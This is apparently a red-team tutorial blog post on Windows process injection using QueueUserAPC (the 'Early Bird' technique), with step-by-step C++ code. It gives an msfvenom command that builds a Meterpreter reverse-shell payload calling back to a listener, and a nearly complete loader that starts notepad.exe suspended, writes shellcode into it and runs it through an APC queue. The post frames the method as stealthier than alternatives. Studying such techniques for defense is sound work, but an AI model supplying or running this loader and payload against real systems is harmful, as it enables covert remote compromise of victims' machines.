---
title: Offensive C++ - Process Injection (ShellCode) - QueueUserAPC
author: nirajkharel
date: 2024-06-29 15:10:00 +0800
categories: [Red Teaming, Offensive Programming]
tags: [Red Teaming, Offensive Programming]
render_with_liquid: false
---


## Process Injection (ShellCode) - QueueUserAPC

APC (Asynchronous Procedure Call) on Windows involves threads having `APC queues` for functions that execute only under specific thread conditions. When an application queues an APC before a thread starts, the thread initiates by invoking the APC function. By starting a process in a suspended state, queuing our shellcode as an APC, and then resuming the main thread, our shellcode executes. This method is stealthier than using `CreateRemoteThread` because processes commonly use the `QueueUserAPC` function and we can do that without triggering user popups, as the main thread remains inactive.

<img alt="" class="bf jp jq dj" loading="lazy" role="presentation" src="https://raw.githubusercontent.com/nirajkharel/nirajkharel.github.io/master/assets/img/images/proc-injection-queueUserAPC.png">

As shown in the image above, we first need to create a process, example Notepad.exe, in a `suspended` state. A suspended state allows a process to be opened but interrupts its normal execution. Once the process is opened, we can obtain a handle to it and its threads. We use `VirtualAllocEx` to allocate memory for the code and `WriteProcess` to write our shellcode into that virtual address space. Instead of using `CreateRemoteThreadEx`, we implement `QueueUserAPC` to queue our malicious code as an APC on the main thread of the process. Then, we resume the thread using the `ResumeThread` function. When `ResumeThread` is called, the Windows system starts with the APC queue created, executing our malicious code without executing the main code on the thread.

### Shellcode
First step would be to generate the shellcode to execute yuor desired command into the process. This can be simple as executing the Calc.exe to basic meterepreter reverse shell to complex and stealth command execution payload that you want. I would love to go through different shellcode techniques and its obfuscation to bypass the defenses but thats for upcoming research plan. Let's stick to the basic meterpreter shellcode as of now.

```bash
msfvenom -platform windows --arch x64 -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.67 LPORT=4444 -f c --var-name=wannabe
```

```c++
#include <iostream>
#include <Windows.h>

int main(){

//shellcode
    unsigned char wannabe[] =
        "\xfc\x48\x83....[snip]...\xf0\xb5\xa2\x56\xff\xd5";
```

Once we have our shellcode ready, the next step is to create a new process in a suspended state. As explained earlier, this generally creates the process without execution. **CreateProcess** appears to be a complex function with a variety of arguments, but most of them are optional and can be left at their default values or set to NULL.

```c++
BOOL CreateProcessA(
  [in, optional]      LPCSTR                lpApplicationName,
  [in, out, optional] LPSTR                 lpCommandLine,
  [in, optional]      LPSECURITY_ATTRIBUTES lpProcessAttributes,
  [in, optional]      LPSECURITY_ATTRIBUTES lpThreadAttributes,
  [in]                BOOL                  bInheritHandles,
  [in]                DWORD                 dwCreationFlags,
  [in, optional]      LPVOID                lpEnvironment,
  [in, optional]      LPCSTR                lpCurrentDirectory,
  [in]                LPSTARTUPINFOA        lpStartupInfo,
  [out]               LPPROCESS_INFORMATION lpProcessInformation
);
```
- **LPCSTR lpApplicationName**: Contains the path of the executable that needs to be executed.
- **LPSTR lpCommandLine**: If there are any command line arguments needed for the above executable, pass them here; otherwise, set it to NULL.
- **LPSECURITY_ATTRIBUTES lpProcessAttributes**: Security attributes that define whether or not the process can be inherited by child processes. Since we do not need that, we can set it to NULL.
- **LPSECURITY_ATTRIBUTES lpThreadAttributes**: Security attributes that define whether or not the thread can be inherited by child processes. Since we do not need that, we can set it to NULL.
- **BOOL bInheritHandles**: Boolean variable to define whether or not handles are inherited. Since they are not, set it to FALSE.
- **DWORD dwCreationFlags**: Variable that controls the priority class while creating the process. Check out the priority classes [here.](https://learn.microsoft.com/en-us/windows/win32/procthread/process-creation-flags) For a suspended state, the priority class would be CREATE_SUSPENDED.
- **LPVOID lpEnvironment**: Contains a pointer to the environment block, like ANSI, Unicode, etc. If set to NULL, it will use the same environment as the calling process.
- **LPCSTR lpCurrentDirectory**: Contains the path to the current directory of the process. Can be set to NULL to allocate the same current directory to the new process as the calling process.
- **LPSTARTUPINFOA lpStartupInfo**: A pointer to the STARTUPINFO structure, which we will discuss later.
- **LPPROCESS_INFORMATION lpProcessInformation**: A pointer to the PROCESS_INFORMATION structure, which contains the handles to the process and threads.


### CreateProcess
```c++
// CreateProcess Variables
STARTUPINFO si;
PROCESS_INFORMATION pi;

ZeroMemory( &si, sizeof(si) );
si.cb = sizeof(si);
ZeroMemory( &pi, sizeof(pi) );

LPCWSTR execFile = L"C:\\Windows\\notepad.exe";
   
// CreateProcess in Suspended State
BOOL bCreateProcess = CreateProcess(execFile, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);

if (bCreateProcess == FALSE) {
    printf("\nError Creating the Process: %d", GetLastError());
    return;
}

printf("Successfully created the process in suspended state\n");
```
### VirtualAllocEx
We need to allocate our buffer into the virtual address space of the running process. Before that, we need to allocate/reserve the region of the memory within the virtual address space. This can be done using VirtualAllocEx function of the windows API. I have already described the [same thing here.](https://nirajkharel.com.np/posts/process-injection-shellcode/#buffer-allocation---virtualallocex)
```c++
// VritualAllocEx Variables
LPVOID lpAddress = NULL;
SIZE_T dwSize = sizeof(wannabe);
DWORD flAllocationType = (MEM_COMMIT | MEM_RESERVE);
DWORD flProtect = PAGE_EXECUTE_READWRITE;

LPVOID lpAlloc = VirtualAllocEx(pi.hProcess, lpAddress, dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
if (lpAlloc == NULL) {
    printf("\nError Allocating the memory: %d", GetLastError());
    return;
}
printf("Successfully allocated memory\n");
```

### WriteProcessMemory
Once we have allocated our memory into the virtual address space, the next process is to write the buffer (shellcode) into that memory space. This was also disucssed in detail in [earlier blog.](https://nirajkharel.com.np/posts/process-injection-shellcode/#write-buffer-into-the-allocated-memory---writeprocessmemory)
```c++
// WriteProcessMemory Variables
LPVOID lpBaseAddress = lpAlloc;
LPCVOID lpBuffer = wannabe;
SIZE_T nSize = sizeof(wannabe);
SIZE_T lpNumberOfBytesWritten = 0;

BOOL bWrite = WriteProcessMemory(pi.hProcess, lpAlloc, lpBuffer, nSize, &lpNumberOfBytesWritten);

if (bWrite == FALSE) {
    printf("\nError Writing buffer to memory: %d", GetLastError());
    return;
}

printf("Successfully written buffer into the memory\n");
```

### VirtualProtectEx
This function is used to change the memory protection options of the allocated address for shellcode from RW (Read and Write) to RX (Read and Execute). If you specify the **PAGE_EXECUTE_READWRITE** option when creating the memory allocation with **VirtualAllocEx**, this function is not needed. The point of using this function here is to follow a generic secure coding process, as memory is not executable until you explicitly change its protection with **VirtualProtectEx**. It's basically like creating a file in read and write mode while writing the content to it, and making it executable when needed, instead of giving read, write, and execute permissions while creating the file.

```c++
BOOL VirtualProtectEx(
  [in]  HANDLE hProcess,
  [in]  LPVOID lpAddress,
  [in]  SIZE_T dwSize,
  [in]  DWORD  flNewProtect,
  [out] PDWORD lpflOldProtect
);
```
- **HANDLE hProcess**: Handle to the process where you want to change the memory protections.
- **LPVOID lpAddress**: Pointer to the base address of the allocated region. Basically the return type of the `VirtualAllocEx` 
- **SIZE_T dwSize**: Size of the shellcode. Same size allocated on `WriteProcessMemory`.
- **DWORD flNewProtect**: Memory protections options to prvoide i.e. PAGE_EXECUTE_READ.
- **PDWORD lpfOldProtect**: Pointer to the output variable which stores the old protection right instead the protection right needs to be restored after execution.

```c++
DWORD lpfOldProtect = NULL;
if (!VirtualProtectEx(pi.hProcess, lpAlloc, nSize, PAGE_EXECUTE_READ, &lpfOldProtect)) {
    printf("[-] Failed to change memory protection from RW to RX: %d \n", GetLastError());
    return;
}
printf("successfully executed virtual protect");
```

### QueueUserAPC
So until now, we have our process/thread in a suspended state, handles to the thread and process, allocation of virtual address, and shellcode written into the memory space. Now we need to add an Asynchronous Procedure Call (APC) object to the APC queue of the specified thread. Each thread in the process contains a queue of these APCs. In this scenario, the function `QueueUserAPC` can be used to queue the thread that contains our malicious shellcode, so when the process is in an alertable state, rather than executing the main thread, the thread that contains the shellcode will be executed.


```c++
DWORD QueueUserAPC(
  [in] PAPCFUNC  pfnAPC,
  [in] HANDLE    hThread,
  [in] ULONG_PTR dwData
);
```

It contains three arguments which are as follows:
- **PAPCFUNC pfnAPC**: It provides a pointer to the APC function. In our case, `lpAlloc` is the function that we need to execute when the process is in an alertable state or when the thread is resumed. `lpAlloc` is a pointer to the allocated memory for our shellcode.
- **HANDLE hThread**: A handle to the thread to which the APC will be queued.
- **ULONG_PTR dwData**: A variable that will be passed to the APC function when executed. Since we do not need to pass any additional parameter to the function, it can be configured as `NULL`.


```c++
DWORD dQueueAPC = QueueUserAPC((PAPCFUNC) lpAlloc, pi.hThread, NULL);
if (dQueueAPC == 0) {
    printf("\nError Queueing APC: %d", GetLastError());
    return;
}
Sleep(1000 * 2);
```

### ResumeThread
Now, once we have our APC function queued on our thread, the next step is to use the **ResumeThread** function to change the state of the thread from the suspended state to the alertable state. Once the thread is resumed, it will resume from the queue of the APC that we have defined, which is our shellcode address.

It contains a single parameter which is a handle to the thread that needs to be restarted.
```c++
DWORD ResumeThread(
  [in] HANDLE hThread
);
```

```c++
// ResumeThread
DWORD dResumeThread = ResumeThread(pi.hThread);
if (dResumeThread == (DWORD)-1) {
    printf("\nError Resuming Thread: %d", GetLastError());
    return;
}
printf("Executing the shellcode");
```

### CloseHandle
It's better to close the handles to your threads and process once the execution is done.
```c++
    // Close handles
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
}
```

<br>
<img alt="" class="bf jp jq dj" loading="lazy" role="presentation" src="https://raw.githubusercontent.com/nirajkharel/nirajkharel.github.io/master/assets/img/images/proc-injection-queueUserAPC.gif">
<br>

## References
- [https://www.youtube.com/watch?v=aMkMkkClXVc&t=468s](https://www.youtube.com/watch?v=aMkMkkClXVc&t=468s)
- [http://rinseandrepeatanalysis.blogspot.com/2019/04/early-bird-injection-apc-abuse.html?m=1](http://rinseandrepeatanalysis.blogspot.com/2019/04/early-bird-injection-apc-abuse.html?m=1)
- [https://www.ired.team/offensive-security/code-injection-process-injection/apc-queue-code-injection](https://www.ired.team/offensive-security/code-injection-process-injection/apc-queue-code-injection)
- [https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-queueuserapc](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-queueuserapc)
- [https://learn.microsoft.com/en-us/windows/win32/procthread/creating-processes](https://learn.microsoft.com/en-us/windows/win32/procthread/creating-processes)
- [https://posts.specterops.io/the-curious-case-of-queueuserapc-3f62e966d2cb](https://posts.specterops.io/the-curious-case-of-queueuserapc-3f62e966d2cb)
- [https://stackoverflow.com/questions/8551004/when-to-use-queueuserapc](https://stackoverflow.com/questions/8551004/when-to-use-queueuserapc)